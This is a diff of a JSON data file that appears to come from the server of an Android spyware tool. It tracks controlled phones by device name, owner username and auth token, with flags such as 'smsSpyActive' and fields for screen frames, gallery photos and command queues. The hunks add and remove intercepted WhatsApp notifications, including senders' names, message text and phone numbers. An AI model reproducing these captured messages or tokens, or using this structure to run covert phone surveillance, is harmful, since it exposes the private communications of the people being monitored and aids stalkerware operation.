@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776767800543,
+    "lastSeen": 1776767818586,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎43 pesan dari 26 chat",
+        "time": "21/04 18:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767820661
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "di situ magrib?",
+        "time": "21/04 18:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767820417
+      },
       {
         "appName": "WhatsApp",
         "sender": "UReport Indonesia",
@@ -4579,6 +4595,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (891 pesan): ~ Rulzz",
+        "content": "20",
+        "time": "21/04 17:36",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776767802575
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎3657 pesan dari 18 chat",
         "time": "21/04 17:36",
@@ -8568,14 +8592,6 @@
         "time": "21/04 17:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1776766207492
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (414 pesan): ~ fikal Lai",
-        "content": "FORMAT NEED AKUN BY FIKAL STORE\n \n(`BUKAN AKUN ADMIN`)\n\nNO BUYER:085736130127\nNAMA : skyy\nAKUN :epep\nSPEK : lumut + bandel gojo\nLOG :gugel\nHARGA :100+\nMC\n\n`WA REKBER FIKAL STORE` : 085761226876\nNOTE\n \n-SETIAP PEMBELIAN AKUN WAJIB MEMAKAI REKBER AGAR UANG KALIAN AMAN\n\n- JANGAN MAU DIAJAK DIRECT/SIS P KALAU JAPOST",
-        "time": "21/04 17:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776766207239
       }
     ],
     "galleryPhotos": [],
@@ -8594,7 +8610,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776767801333,
+    "lastSeen": 1776767819344,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -8635,7 +8651,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776767800032,
+    "lastSeen": 1776767818076,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
